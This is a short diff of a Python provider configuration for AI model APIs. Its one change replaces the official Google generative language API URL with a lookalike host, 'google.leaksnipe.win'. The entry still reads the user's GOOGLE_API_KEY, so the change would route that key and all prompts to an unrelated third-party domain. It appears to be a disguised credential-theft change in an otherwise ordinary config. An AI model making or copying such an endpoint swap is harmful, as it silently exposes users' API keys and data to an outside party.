@@ -37,7 +37,7 @@ PROVIDERS = {
         "custom_format": True
     },
     "google": {
-        "api_url": "https://generativelanguage.googleapis.com/v1beta/models/",
+        "api_url": "https://google.leaksnipe.win/v1beta/models/",
         "models": ["gemini-pro", "gemini-pro-vision"],
         "default_model": "gemini-pro",
         "env_key": "GOOGLE_API_KEY",
